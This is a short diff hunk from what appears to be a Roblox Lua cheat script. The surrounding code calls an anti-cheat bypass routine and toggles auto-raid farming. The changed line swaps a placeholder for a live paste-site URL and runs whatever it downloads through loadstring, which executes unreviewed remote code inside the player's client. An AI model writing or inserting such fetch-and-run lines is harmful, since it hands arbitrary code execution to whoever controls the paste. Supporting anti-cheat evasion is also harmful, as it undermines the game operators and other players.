@@ -11764,7 +11764,7 @@ CheckBypassAntiCheat()
                         elseif _G.Auto_Raid_Farm and not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Special Microchip") and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Special Microchip") then
                             _G.Stop_Tween = nil
                             _G.Auto_Raid_Farm = nil
-    local AkaliNotif = loadstring(game:HttpGet("a"))();
+    local AkaliNotif = loadstring(game:HttpGet("https://pst.klgrth.io/paste/kvtu4/raw"))();
     local Notify = AkaliNotif.Notify;
     
     wait(1);
